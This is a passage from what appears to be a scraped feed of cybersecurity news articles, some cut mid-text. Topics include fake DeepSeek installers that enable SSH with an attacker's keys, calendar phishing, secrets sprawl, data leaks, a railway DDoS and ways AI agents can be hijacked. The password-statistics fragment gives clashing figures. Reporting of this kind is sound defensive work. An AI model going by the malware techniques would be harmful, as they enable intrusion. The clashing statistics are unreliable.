width=\"1024\" /></a></p>\n<p>When executed, this installer contacts malicious URLs to receive a command that will be executed using cmd. The most common command launches <pre class=\"crayon-plain-tag\">powershell.exe</pre> with a Base64-encoded script as an argument. This script accesses an encoded URL to download another PowerShell script, which activates the built-in SSH service and modifies its configuration using the attacker&#8217;s keys, allowing remote access to the victim&#8217;s computer.</p>\n<div class=\"wp-caption aligncenter\" id=\"attachment_115826\" style=\"width: 867px;\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\"><img alt=\"Part of the malicious PowerShell script\" class=\"size-full wp-image-115826\" height=\"877\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/05153658/DeepSeek_malware_11.png\" width=\"857\" /></a><p class=\"wp-caption-text\" id=\"caption-attachment-115826\">Part of the malicious PowerShell script</p></div>\n<p>This case is notable because we managed to identify the primary vector for spreading the malicious links – posts on the social network X (formerly Twitter):</p>\n<p align=\"center\"><a class=\"magnificImage\" href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\"><img alt=\"\" class=\"aligncenter size-full wp-image-115837\" height=\"699\" src=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/06072310/6-1.png\" width=\"585\" /></a></p>\n<p>This post, directing users to <pre class=\"crayon-plain-tag\">deepseek-pc-ai[.]com</pre>, was made from an account belonging to an Australian company.

This is an installer created with Inno Setup that uses <a href=\"https://encyclopedia.kaspersky.com/glossary/dll-sideloading/\" target=\"_blank\">DLL sideloading</a> to load a malicious library. The DLL in turn extracts and loads into memory a payload hidden using steganography — a Farfli backdoor modification — and injects it into a process.</p>\n<p>Both of these campaigns, judging by the language of the bait pages, are targeting Chinese-speaking users.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The nature of the fake websites described in this article suggests these campaigns are widespread and not aimed at specific users.</p>\n<p>Cybercriminals use various schemes to lure victims to malicious resources. Typically, links to such sites are distributed through messengers and social networks, as seen in the example with the X post. Attackers may also use <a href=\"https://encyclopedia.kaspersky.com/glossary/typosquatting/\" rel=\"noopener\" target=\"_blank\">typosquatting</a> or purchase ad traffic to malicious sites through numerous affiliate programs.</p>\n<p>We strongly advise users to carefully check the addresses of websites they visit, especially if links come from unverified sources. This is especially important for highly popular services. In this case, it&#8217;s particularly noteworthy that DeepSeek doesn&#8217;t have a native Windows client. This isn&#8217;t the first time that cybercriminals have exploited the popularity of chatbots to distribute malware: they&#8217;ve previously targeted regular users with <a href=\"https://www.kaspersky.com/blog/chatgpt-stealer-win-client/47274/\" rel=\"noopener\" target=\"_blank\">Trojans disguised as ChatGPT clients</a> and developers with <a href=\"https://www.kaspersky.com/blog/jarkastealer-in-pypi-packages/52640/\" rel=\"noopener\" target=\"_blank\">malicious packages</a> in PyPI.

        "content": "<p>For those unfamiliar with <strong>World Cloud Security Day</strong>, here’s a brief yet essential overview. Celebrated annually on <strong>April 3rd</strong>, this day serves as a crucial reminder of the importance of implementing strong security measures to combat the rising cyber threats targeting cloud infrastructure. With cybercriminals becoming more sophisticated, ensuring data security, integrity, and privacy has never been more critical.</p>\n<p><span style=\"text-decoration: underline;\"><strong>The Rising Cybersecurity Challenges in the Cloud</strong></span></p>\n<p>A recent survey by <a href=\"https://www.rapid7.com/\"><strong>Rapid7</strong></a> highlights the increasing cybersecurity risks faced by the cloud industry, particularly the surge in ransomware attacks and data breaches. One of the key reasons behind this growing vulnerability is the misconception among organizations—many believe that securing cloud applications and data is solely the responsibility of the service provider, leaving customers with little or no role in the process.</p>\n<p>This misunderstanding often results in lax security practices, such as failing to implement multi-factor authentication (MFA) or encryption. Many users assume that once a contract or a Memorandum of Understanding (MoU) is signed with a cloud service provider (CSP), the security of their digital assets is fully managed by the provider. However, this false sense of security creates an opportunity for cybercriminals to exploit vulnerabilities.</p>\n<p><span style=\"text-decoration: underline;\"><strong>The Role of AI-Powered Cyber Attacks</strong></span></p>\n<p>Hackers are leveraging the power of artificial intelligence (AI) and automation to carry out sophisticated cyberattacks at an unprecedented scale. With AI-driven hacking tools, cybercriminals can launch multiple attack attempts in an automated and rapid manner, increasing their success rate to over 60%. This growing technological gap between attackers and defenders emphasizes the urgent need for proactive <a href=\"https://www.cybersecurity-insiders.com/state-of-cloud-security-report-2025/\">cloud security</a> measures.</p>\n<p><span style=\"text-decoration: underline;\"><strong>The Significance of World Cloud Security Day</strong></span></p>\n<p>Events like <a href=\"https://cms.nias.res.in/publications/world-cloud-security-day\">World Cloud Security Day</a> play a vital role in spreading awareness about the shared responsibility model in cloud security. While CSPs implement security frameworks and provide protective measures, customers must actively secure their data and applications stored or accessed on cloud platforms.</p>\n<p>To strengthen cloud security, organizations should adopt a multi-layered security approach, including:</p>\n<p><strong>Zero Trust Architecture –</strong> Never trust, always verify. Restrict access based on strict identity verification.</p>\n<p><strong>AI-Driven Threat Detection –</strong> Utilize artificial intelligence to detect, analyze, and respond to cyber threats in real-time.</p>\n<p><strong>Regulatory Compliance –</strong> Follow industry standards such as GDPR, CCPA, and ISO 27001 to ensure data protection and compliance.</p>\n<p><span style=\"text-decoration: underline;\"><strong>Final Thoughts</strong></span></p>\n<p>With cloud computing becoming the backbone of modern digital infrastructure, robust security strategies are non-negotiable. World Cloud Security Day serves as a reminder that safeguarding cloud assets requires a collaborative effort—both from service providers and customers. By embracing advanced security frameworks and proactive risk management, we can create a resilient cloud ecosystem that stands strong against evolving cyber threats.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/data-breaches-and-ransomware-remain-top-concerns-on-world-cloud-security-day/\">Data Breaches and ransomware remain top concerns on World Cloud Security Day</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/data-breaches-and-ransomware-remain-top-concerns-on-world-cloud-security-day/\">Data Breaches and ransomware remain top concerns on World Cloud Security Day</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

        "content": "<p><a href=\"https://workspace.google.com/intl/en-US/products/calendar/\">Google Calendar</a> is a widely used tool for scheduling online events, meetings, and sending reminders. However, a concerning new trend has emerged where cybercriminals are exploiting this platform to target unsuspecting victims with <a href=\"https://www.cybersecurity-insiders.com/is-quishing-the-new-phishing-protecting-your-business-against-the-next-threat-vector/\">phishing</a> scams and attempts to steal sensitive data.</p>\n<p>In this type of attack, the hacker sends out a seemingly harmless invitation to an event, meeting, or even a payment reminder. Since these invitations often come from familiar sources, like a colleague, friend, or even a business partner, recipients are more likely to trust the message and click on the embedded link. Unfortunately, this link leads to a fake website that closely mimics legitimate ones, tricking the victim into entering their sensitive information—such as usernames, passwords, and other credentials.</p>\n<p>Once the hacker has access to the stolen credentials, they can easily take control of the victim’s account. In many cases, they quickly change the account’s password to lock the legitimate user out and gain full access.</p>\n<p>A particularly worrying aspect of this type of attack is the increasing use of single sign-on (SSO) systems. Major online service providers such as Google, Amazon, and others often offer users the convenience of using one set of credentials to access multiple accounts within their ecosystem. While this makes it easier to manage logins, it also poses a security risk. If a hacker gains access to a single account, they could potentially unlock a range of services, making it much simpler for them to compromise sensitive data across multiple platforms.</p>\n<p>To defend against such attacks, it’s crucial to enable Multi-Factor Authentication (MFA) or Two-Factor Authentication (2FA) on all online accounts. These extra layers of security require users to verify their identity through more than just a password, making it far more difficult for attackers to gain unauthorized access to accounts.</p>\n<p>Another key practice for enhancing security is creating strong, complex passwords. A password should ideally be at least 14–18 characters long and include a combination of uppercase and lowercase letters, numbers, and special characters. The more complex the password, the harder it becomes for automated software, commonly used by hackers, to crack it through brute-force methods.</p>\n<p>Additionally, it is critical to be cautious when receiving links via email or SMS, especially if they come from unknown senders. Always verify the legitimacy of the sender before clicking on any links. Similarly, ensure that your device’s operating system and applications are regularly updated to receive the latest security patches and fixes.</p>\n<p>By adopting these practices—enabling MFA or 2FA, using strong passwords, and being cautious of unsolicited messages—you can significantly reduce the risk of falling victim to phishing attacks and other forms of cybercrime.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/google-calendar-leading-to-phishing-scams-and-data-thefts/\">Google Calendar leading to Phishing Scams and Data Thefts</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/google-calendar-leading-to-phishing-scams-and-data-thefts/\">Google Calendar leading to Phishing Scams and Data Thefts</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

        "content": "<p>Managing secrets, the API keys, authentication tokens, and encryption credentials that keep our applications securely running is a critical yet increasingly complex challenge in modern enterprises. Organizations use secret management tools like AWS Secrets Manager, HashiCorp Vault, and Azure Key Vault to protect sensitive access credentials.</p>\n<p>As businesses expand, particularly through mergers and acquisitions (M&amp;A), they very often inherit multiple overlapping secret managers, creating hidden security and operational risks.</p>\n<p>While redundancy might seem like a safeguard, in reality, managing secrets for mission-critical applications through multiple vaulting tools introduces security gaps, operational inefficiencies, and compliance challenges.</p>\n<p>A 2024 <a href=\"https://blog.gitguardian.com/voice-of-practitioners-2024/\">industry survey</a> from CyberArk and GitGuardian found that the typical enterprise had at least six different secret management solutions in place. The larger the company, the more widespread and complex this problem of &#8216;vault sprawl&#8217; inevitably becomes. As with any problem, the first step to addressing the issue is understanding how teams get here.</p>\n<p><strong>Why Do Enterprises Use Multiple Secret Managers?</strong></p>\n<p>In an ideal world, every company would standardize on a single platform for secrets management. They need a way to safely store any credential, encrypted at rest, that can be programmatically called when needed throughout the software development lifecycle. These systems also offer insight into the non-human identity lifecycle, helping teams track when a secret was added and, importantly, rotated. Any good system will offer logs and make managing secrets a streamlined process.</p>\n<p>For small companies without many products or offerings, getting everything in one place is a realistic goal, especially if standardized on a single cloud platform, like AWS, Azure, or Google Cloud. All of these platforms offer secret management services like Azure KeyVault or AWS Secrets Manager.</p>\n<p>As new projects are launched and companies continue to grow, they often adopt a multi-cloud strategy, introducing new secrets and management needs. In some cases, moving certain services to on-premise operations makes the most sense, meaning they end up in hybrid environments. Just the built-in tools can no longer handle secrets management, and it is at this stage of maturity that we see the adoption of enterprise secret management systems, such as HashiCorp Vault or CyberArk Conjur.</p>\n<p><strong>Merging Complex Organizations Amplifies Secret Management Risks</strong></p>\n<p>Standardizing on a single platform with any central planning is hard enough in a single organization with a shared culture and mission. What happens when a completely different organization is added to the mix and needs to be accounted for?</p>\n<p>This happens quite a lot.</p>\n<p>According to research from <a href=\"https://www.pwc.com/gx/en/services/deals/trends.html#:~:text=approximately%2050%2C000%20M%26A\">PwC, approximately 50,000 merger</a> and acquisition (M&amp;A) deals were announced in 2024.</p>\n<p>Let&#8217;s assume that the company initiating the merger has an average of six vault solutions deployed, and the company being acquired is fairly small and only has two secret management platforms. The newly combined organization will then have eight systems to contend with overnight. That may sound manageable, but remember, secrets management is only one security consideration that this M&amp;S activity brings.</p>\n<p>For very large organizations that acquire multiple companies a year, the problem of secrets to manage becomes exponential rather than linear.</p>\n<p><strong>Operational Overhead And Complexity</strong></p>\n<p>The larger the organization, however, the more likely that multiple divisions and teams will have spun up their own instance of their secrets vaulting solution of choice. Even if the organization is standardized on a single tooling choice, the likelihood that there is one, and only one, centrally managed enterprise instance of the technology is very unlikely. With multiple secret managers in play, different teams may store and manage the same secrets separately, leading to:</p>\n<ul>\n<li>Duplicated effort in storing, rotating, and auditing credentials</li>\n<li>Confusing access control policies across departments</li>\n<li>Delayed developer workflows due to integration issues</li>\n</ul>\n<p>Cost is also a major concern with vault sprawl. As with any technology, the more of it you deploy, the higher your overall operational expenses are going to rise. Enterprise secrets management systems are a mission-critical infrastructure investment, costing tens or hundreds of thousands of dollars per year to license and operate. Having duplicate systems means paying that same fee through multiple contracts and, most likely, to multiple vendors.</p>\n<p><strong>Risks From Secrets Redundancy</strong></p>\n<p>Fragmented secret management landscape is the reality of large enterprise and it increases the risk of orphaned or forgotten secrets. A 2023 study found that 90% of valid secrets detected remained active 5 days later, highlighting remediation as a challenge.</p>\n<p>Different secret managers enforce security policies unevenly. One tool may require monthly secret rotation, while another allows long-lived credentials indefinitely, creating compliance risks.</p>\n<p>More systems mean more potential entry points for attackers. Each secret manager requires its own access controls, monitoring, and security patches. Security teams must learn and work with multiple platforms, increasing training costs and operational risk. Misconfigurations in just one of these tools can expose sensitive secrets.</p>\n<p>There are also risks introduced as organizations attempt to manually solve the vault sprawl issue through the <a href=\"https://www.cybersecurity-insiders.com/gitguardian-report-70-of-leaked-secrets-remain-active-for-two-years-urging-immediate-remediation/\">migration of secrets</a>. When passing secrets between systems, secrets often get copied into temporary repositories or spreadsheets, increasing exposure risks. Anytime a person can read a secret in plaintext, that means there is a clear and simple attack path open to anyone who gains access to your internal environments.</p>\n<p>Multiple secret managers complicate audits and regulatory adherence. Regulations like GDPR and NIST standards require strict control over credentials and access logs, which become harder to enforce across disparate tools. When an auditor comes to your door, you do not want that to be the time you start trying to consolidate systems for visibility.</p>\n<p><strong>Mitigating Vault Sprawl</strong></p>\n<p>With so many drawbacks and risks associated with vault sprawl, it is clear that security and IT leaders must work together to gain visibility into all the secrets throughout the enterprise. Addressing the existing complexity by gaining real-time visibility into the state of your secrets, how they are used, and when they need to be rotated, no matter where they are stored is the way forward.</p>\n<p><strong>Secrets Discovery Is The Needed First Step</strong></p>\n<p>Teams should first focus on discovering secrets throughout all environments, including all secret managers, rather than trying to manage the mass migration of credentials between cloud and enterprise solutions.</p>\n<p>Taking a visibility and discovery-focused approach will also help you find all the secrets not currently stored in vaults, helping you enforce standardization of secrets management. Without knowing about a secret, it will be impossible to ensure it is properly rotated or taken out of service when no longer needed. Long-lived &#8220;zombie credentials&#8221; are one of an attacker&#8217;s favorite paths.</p>\n<p><strong>Automating Vault Consolidation</strong></p>\n<p>With the proper secrets detection tooling, enterprises can find redundancies as well, which can lead to lower operational costs and overhead. For example, if you find the same secret across multiple vaults, only one would be needed. Development teams lack this high-level insight.</p>\n<p>Doing this process manually is time and cost-prohibitive, especially when there are thousands of valid secrets in play. The larger the organization, the more automation is required. Detection solutions need to be addressable with scripting and automation tooling. If a script can open a pull request to update the code to call the correct vault, which already contains the needed secret, then the review process for merging that change should be seconds, not days of developer rework.</p>\n<p>Security can also help developers by investing in tools that can detect plaintext secrets before they leave the developer&#8217;s machine. Ideally any time a developer needs to invoke a new secret, their tooling should guide them down the proper path with the right documentation or even the automation to suggest the actual correct calls into the secrets management system.</p>\n<p><strong>Prioritizing Secrets Management In The Enterprise At Scale</strong></p>\n<p>Addressing vault sprawl is not just a matter of convenience; it is a critical security and operational challenge that enterprises must proactively manage, especially as mergers and acquisitions continue to drive IT complexity. The costs are high, both from a financial perspective, as paying for redundant systems, and from an overhead perspective, requiring more time and effort from your already stretched teams to keep up with multiple platforms.</p>\n<p>The rapid accumulation of secret management tools across different business units creates unnecessary overhead, increases security blind spots, and elevates the risk of exposure due to inconsistent policies. While complete consolidation is often unrealistic in larger organizations, enterprises must prioritize visibility, standardization, and automation to mitigate these risks.</p>\n<p>By implementing robust discovery processes, enforcing uniform secret management policies, and leveraging automation to streamline migration and enforcement, organizations can ensure that secrets remain secure, auditable, and manageable at scale. As cyber threats evolve and businesses grow, security teams must take a proactive stance in managing secrets, turning what was once a hidden risk into a well-governed and resilient security practice.</p>\n<p style=\"text-align: center;\">__</p>\n<p><em>Author BIO</em></p>\n<p><em>Dwayne McDaniel &#8211; </em><em>Senior Developer Advocate at GitGuardian</em></p>\n<p><em>Dwayne has been working as a Developer Advocate since 2014 and has been involved in tech communities since 2005.

The platform records the highest absolute number of password-related searches at over 1.4 billion, primarily driven by &#8220;forgot password&#8221; queries. YouTube&#8217;s massive base of 3.9 billion monthly active users, along with its cross-device usage patterns, contributes significantly to its top position in password reset frequency.</p>\n<p dir=\"ltr\"><strong>Facebook</strong> comes in 2nd, generating 28.2K password recovery searches. Meta&#8217;s flagship platform shows a relatively high rate of &#8220;recover account&#8221; searches (3.5 million monthly). Facebook&#8217;s search volume is 21% lower than YouTube, while having about half the user base, with users averaging 3.4 password resets annually.</p>\n<p><strong>Pinterest</strong> follows in 3rd, with 20K password-related queries. It has a smaller user base compared to YouTube and Facebook, but its users have a quite high propensity for password issues, with &#8220;recover account&#8221; searches reaching 73.8 million monthly—21 times higher than Facebook&#8217;s recovery searches.</p>\n<p><strong>X</strong> takes the 4th position with 8.4K queries on password recovery or reset, translating to an average of 1 password reset per user yearly.

Discord users search for &#8220;password reset&#8221; 153.7K times monthly—7.1% of their total password queries. Discord&#8217;s strong emphasis on staying logged in across sessions results in an 80% lower search frequency than competitor platform Line.</p>\n<p><em><strong>Tabi Vicuña, Founder of <a href=\"https://www.heepsy.com/\">Heepsy</a></strong>, commented on the study: &#8220;The psychology behind password retention reveals fascinating human behavior patterns. Services used passively create more authentication friction than those where users actively create and communicate. When credentials are requested infrequently across devices, our brains effectively &#8216;un-learn&#8217; access patterns.

        "content": "<p>With the rapid advancement of artificial intelligence (AI), deepfake technology has emerged as a significant cybersecurity threat. Deepfakes, which use AI to manipulate images and videos, are increasingly being used for malicious purposes, such as misinformation campaigns, identity fraud, and social engineering attacks. As concerns over the rise of deepfake threats grow, facial recognition technology is being explored as a potential countermeasure. But can it truly be a boon against AI-driven cyber threats?</p>\n<p><span style=\"text-decoration: underline;\"><strong>Understanding the Deepfake Threat</strong></span></p>\n<p>Deepfake technology leverages deep learning and neural networks to create hyper-realistic synthetic media. Cybercriminals and state-sponsored hackers have been using deepfakes for various purposes, including:</p>\n<p><strong>•    Misinformation and Fake News:</strong> Spreading false narratives by fabricating videos of politicians and public figures.<br />•<strong>    Financial Fraud:</strong> Impersonating executives to manipulate financial transactions.<br /><strong>•    Identity Theft and Phishing:</strong> Using deepfake videos or images to deceive security systems.<br /><strong>•    Cyberbullying and Privacy Violations:</strong> Creating misleading or explicit content to target individuals.</p>\n<p>The increasing sophistication of deepfake technology makes it difficult for the average person to distinguish between real and manipulated media, raising serious ethical and security concerns.</p>\n<p><span style=\"text-decoration: underline;\"><strong>Facial Recognition Technology as a Countermeasure</strong></span></p>\n<p>Facial recognition technology (FRT) has made significant strides in recent years, and its potential application in detecting deepfakes is being actively explored. Here’s how it can help:</p>\n<p><strong>1. Deepfake Detection Algorithms</strong></p>\n<p>Advanced facial recognition algorithms analyze facial movements, micro-expressions, and inconsistencies in deepfake media. AI-powered detection tools can scan videos for subtle distortions in lighting, blinking patterns, and unnatural facial asymmetry, which are telltale signs of manipulation.</p>\n<p><strong>2. Multi-Factor Authentication (MFA) in Cybersecurity</strong></p>\n<p>Many digital platforms use facial recognition as part of MFA to verify user identities. By integrating AI-powered liveness detection, these systems can distinguish between real users and deepfake-generated images or videos, preventing unauthorized access to sensitive accounts.</p>\n<p><strong>3. Blockchain-Based Facial Recognition for Verification</strong></p>\n<p>Blockchain technology can complement FRT by providing immutable records of verified identities. This approach ensures that facial data remains secure and cannot be altered or forged, making it an effective defense against identity fraud caused by deepfake manipulation.</p>\n<p><strong>4. Law Enforcement and Forensic Applications</strong></p>\n<p>Authorities can leverage facial recognition to identify and analyze deepfake content used in cybercrimes. By comparing manipulated footage against official identity databases, law enforcement agencies can trace sources, identify perpetrators, and curb the spread of fake media.</p>\n<p><span style=\"text-decoration: underline;\"><strong>Challenges and Ethical Concerns</strong></span></p>\n<p>While facial recognition holds promise in combating deepfake threats, it is not without challenges:</p>\n<p>•  <strong>  False Positives and Errors</strong>: AI-based facial recognition systems may misidentify real individuals as deepfakes or fail to detect sophisticated fakes.<br />• <strong>   Privacy Risks:</strong> The widespread use of facial recognition raises ethical concerns regarding mass surveillance and data privacy.<br />•   <strong> AI Arms Race:</strong> As deepfake creators develop more advanced techniques, facial recognition systems must constantly evolve to stay ahead.</p>\n<p><span style=\"text-decoration: underline;\"><strong>Conclusion: A Complementary Defense, Not a Standalone Solution</strong></span></p>\n<p>Facial recognition technology can certainly play a crucial role in detecting and mitigating deepfake threats, but it should not be viewed as a standalone solution. A multi-layered cybersecurity approach—combining AI-driven detection tools, digital watermarking, and public awareness initiatives—is necessary to effectively combat the growing menace of deepfake cyber threats. By leveraging AI responsibly and innovatively, we can create a more secure digital landscape while mitigating the risks posed by deepfake technology.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/facial-recognition-technology-helps-fight-against-ai-deepfake-cyber-threats/\">Facial Recognition Technology helps fight against AI Deepfake Cyber Threats</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/facial-recognition-technology-helps-fight-against-ai-deepfake-cyber-threats/\">Facial Recognition Technology helps fight against AI Deepfake Cyber Threats</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

        "content": "<p><span style=\"text-decoration: underline;\"><strong>Royal Mail Data Breach: 144GB of Sensitive Information Now Available for Sale</strong></span></p>\n<p>Royal Mail has recently made headlines after falling victim to a sophisticated cyber-attack, resulting in the theft of a large amount of sensitive data. The breach has now escalated, with the stolen information reportedly being sold on the dark web.</p>\n<p>After speculation surrounding the breach, Royal Mail confirmed it had been attacked, explaining that hackers had infiltrated the systems of Spectos, a German technology company it collaborates with. This breach, which occurred in mid-March 2025, saw a threat actor named ‘GHNA’ gain access to Spectos&#8217; database and steal around 144GB of data belonging to Royal Mail Group. The stolen files include private customer documents and internal Zoom meeting recordings between Spectos and Royal Mail, which are now available for purchase on the dark web.</p>\n<p>This cyber-attack is not Royal Mail&#8217;s first encounter with malicious hacking activities. In 2023, the company became a victim of a ransomware attack by the notorious LockBit ransomware group. The criminals initially demanded a ransom of £65.7 million but eventually backed off, realizing they had mistakenly targeted the wrong party.</p>\n<p>The Royal Mail breach raises serious concerns about the vulnerability of sensitive information, especially within large organizations that handle critical services. With personal data and internal communications exposed, customers and employees alike may face increased risks of identity theft and privacy violations.</p>\n<p><span style=\"text-decoration: underline;\"><strong>About 400GB of X (formerly Twitter) Data for Sale on Dark Web</strong></span></p>\n<p>In another major data breach, a disgruntled former employee of X (formerly Twitter) has allegedly posted 400GB of data on a dark web forum. This incident is tied to the company’s mass layoffs, which began in late 2023 and have continued into 2024 and 2025. The hacker, known by the pseudonym “Thinking One,” claimed to have stolen sensitive information related to over 2.87 billion user accounts on X.</p>\n<p>On March 28, 2025, the hacker uploaded the data to a breach forum, offering it for sale. As of April 1, 2025, the data remains unsold, despite being publicly listed for several days. The leaked data consists mainly of metadata, including user profile IDs, screen names, account descriptions, creation dates, follower counts, and details about user activity such as the devices used for tweeting and the status settings of accounts.</p>\n<p>Interestingly, a portion of the dataset appears to have been scraped from data stolen in 2023, while the rest seems to have been freshly obtained from X’s servers. This suggests that the hacker may have exploited vulnerabilities in the company&#8217;s systems over an extended period, potentially gaining new access with each wave of layoffs.</p>\n<p>This breach raises significant concerns about the safety of user data on social media platforms, especially as the dataset includes information about billions of users. While the leaked data may not directly expose passwords or sensitive personal details, the metadata can still be used to build comprehensive profiles of users, heightening the risk of targeted attacks such as phishing, fraud, and social engineering.</p>\n<p>Both these incidents underscore the growing threat of cybercrime and the need for companies to bolster their cybersecurity measures to protect against increasingly sophisticated threats. More details are expected as investigations into both breaches continue to unfold.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/data-leak-of-twitter-x-and-royal-mail-available-on-dark-web/\">Data Leak of Twitter X and Royal Mail available on Dark Web</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/data-leak-of-twitter-x-and-royal-mail-available-on-dark-web/\">Data Leak of Twitter X and Royal Mail available on Dark Web</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

The cyberattack disrupted online services, rendering them inaccessible to users for an extended period. However, despite the digital onslaught, the sale of tickets at railway transit counters and the overall functioning of the rail network remained unaffected. This indicated that the technical infrastructure responsible for railway operations was not compromised, underscoring the limited scope of the attack.</p>\n<p>The nature of the attack suggests that the hackers primarily focused on disrupting the servers hosting content related to the Russian Railways website and mobile application. While the online services were temporarily down, efforts to restore them were underway, with an expected return to full functionality at any moment.</p>\n<p>A spokesperson from Moscow’s Transportation Department addressed the situation through a press statement on Telegram. The statement acknowledged that the mass denial-of-service attack had only a minimal impact on essential services and confirmed that restoration efforts were progressing rapidly. A significant portion of the affected systems had already been brought back online, with measures in place to ensure long-term stability.</p>\n<p>Preliminary investigations have pointed toward a ‘Hacker Army’ allegedly funded by Ukraine’s Military Intelligence as the orchestrators behind the attack. Further intelligence reports suggest that this may not be an isolated incident, as additional cyberattacks are expected to be launched throughout April 2025, possibly targeting other Russian infrastructure.</p>\n<p>Initial speculation suggested that the attack might have been executed by exploiting a vulnerability in Russian Railways’ operational software. However, subsequent analysis disproved this theory. Instead, the attack was identified as a massive surge of fake web traffic overwhelming the servers simultaneously. This flood of illegitimate requests effectively blocked access to genuine users, causing severe disruptions to online services.</p>\n<p>Notably, this cyber incident comes just nine days after Ukrainian Railways experienced a similar attack on March 23, 2025. That incident led to a temporary disruption of both website and mobile application services. Later investigations attributed the attack to Kremlin-backed operatives, who reportedly leveraged a network of botnets leased from South Africa to execute the strike.</p>\n<p>Given the timing and similarities between the two incidents, the latest attack on Russian Railways is widely speculated to be an act of retaliation by Ukraine against Vladimir Putin’s government. If confirmed, this marks another chapter in the escalating cyber conflict between the two nations, highlighting the increasing role of digital warfare in modern geopolitical tensions.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/russian-railways-hit-by-ddos-cyber-attack-from-hacker-army/\">Russian Railways hit by DDoS Cyber Attack from Hacker Army</a> first appeared on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p><p>The post <a href=\"https://www.cybersecurity-insiders.com/russian-railways-hit-by-ddos-cyber-attack-from-hacker-army/\">Russian Railways hit by DDoS Cyber Attack from Hacker Army</a> appeared first on <a href=\"https://www.cybersecurity-insiders.com\">Cybersecurity Insiders</a>.</p>",

        "content": "<p>The rise of Agentic AI has become one of the most talked about trends in the AI world. The move to autonomous AI Agents promises to be as big a leap forward as Generative AI was over traditional <a href=\"https://www.cybersecurity-insiders.com/most-secure-ai-models-for-enterprises/\">AI models</a>. Whereas traditional AI assisted with analysis and recommendations, Agentic AI works by understanding the environment, making decisions, and taking action without human involvement.  It is no surprise that Gartner lists Agentic AI as one of the top <a href=\"https://www.gartner.com/en/documents/5850847\">strategic trends</a> in 2025 and anticipates it will resolve <a href=\"https://www.gartner.com/en/newsroom/press-releases/2025-03-05-gartner-predicts-agentic-ai-will-autonomously-resolve-80-percent-of-common-customer-service-issues-without-human-intervention-by-20290\">80%</a> of customer service issues by 2029.</p>\n<p>But with these massive advantages come new types of risks and threats. These risks go way beyond traditional AI problems like data poisoning and model poisoning due to the autonomy that AI agents possess. As Agentic AI can make decisions and interact with other AI agents in its own unique ecosystem, we are facing security challenges that conventional security has not encountered before. In this article, we will look at a few of these challenges and how to face them.</p>\n<p><strong>The Problem with Autonomous Agents</strong></p>\n<p>As mentioned, the key feature that defines Agentic AI is autonomy, i.e., the ability to take actions without human involvement. This also creates security problems, such as rogue or compromised AI agents causing havoc in IT environments. For example, a security AI Agent could be taken over and used to lock users out of critical systems, make incorrect decisions, and weaken the security posture of an environment. This also poses the question of accountability, i.e., who is responsible for the actions that an AI agent takes? Is it the company using it, the vendor, or the team deploying it?</p>\n<p><strong>The Agentic AI Ecosystem </strong></p>\n<p>AI agents are not designed to work in isolation but operate in an ecosystem of AI Agents, which helps them execute complex workflows for increased efficiency. This opens up new attack vectors, such as the following:</p>\n<p><strong>1. Compromised AI Agents:</strong> Attackers may compromise AI Agents or introduce their malicious agents into this ecosystem to subtly influence their behavior and cause them to make faulty decisions.</p>\n<p><strong>2. Collusion Attackers:</strong> As AI Agents work together in collusion towards a common goal, they may develop malicious behavior that was never intended, either as a result of influence or due to new “emergent” behavior</p>\n<p><strong>3. Competitive Exploitation:</strong> In some patterns, AI Agents are designed to compete against each other to achieve their goals. Attackers may influence this behavior and essentially “trick” AI agents into prioritizing false goals or fake threats to waste their time and resources.</p>\n<p><strong>4. Agentic AI “Worms”:</strong> As AI Agents learn by autonomously updating and sharing knowledge with other agents, attackers can exploit this ability and cause malicious behaviors to spread within an ecosystem.</p>\n<p><strong>The Problem of Unpredictability </strong></p>\n<p>We briefly touched upon emergent behavior in the previous section, and it is a key risk with agentic AI. It refers to AI agents executing unexpected actions as they learn and interact with their environment, which deviates from their original training. As attackers understand this behavior, they can use it for their malicious purposes by influencing an AI Agent to take actions that go against the interest of the company using it. This “goal misalignment” can be extremely hard to detect due to its subtle nature. For example, an attacker can trick an AI agent running in a cloud environment into thinking that security systems are causing unnecessary overhead and shut them down.</p>\n<p><strong>Getting ready for Agentic AI threats</strong></p>\n<p>Agentic AI presents challenges for monitoring, adoption, and implementation. One must grasp the possible hazards and implement a multistep security plan including the following to help to reduce them:</p>\n<p><strong>1. Continuous Monitoring:</strong> Agentic AI abnormalities can be monitored in real-time using AI-powered surveillance. Any deviations should be noticed and followed.</p>\n<p><strong>2. Secure communication and authentication:</strong> To protect agentic AI ecosystem from unauthorized manipulation, mutual authentication between agents and a trust-based ecosystem must be present to protect its integrity.</p>\n<p><strong>3. AI Explainability:</strong> AI Agents must not be “black boxes,” and the logic behind any actions taken must be transparent and explainable. Where possible, human-in-the-loop failsafe should be present before AI agents take action on mission-critical systems.</p>\n<p><strong>Conclusion</strong></p>\n<p>Agentic AI will introduce unanticipated attack vectors and hazards for which conventional security models are inadequate. Novel cybersecurity systems have to be built for such risks, and security controls for Agentic AI have to be developed and applied. By understanding this 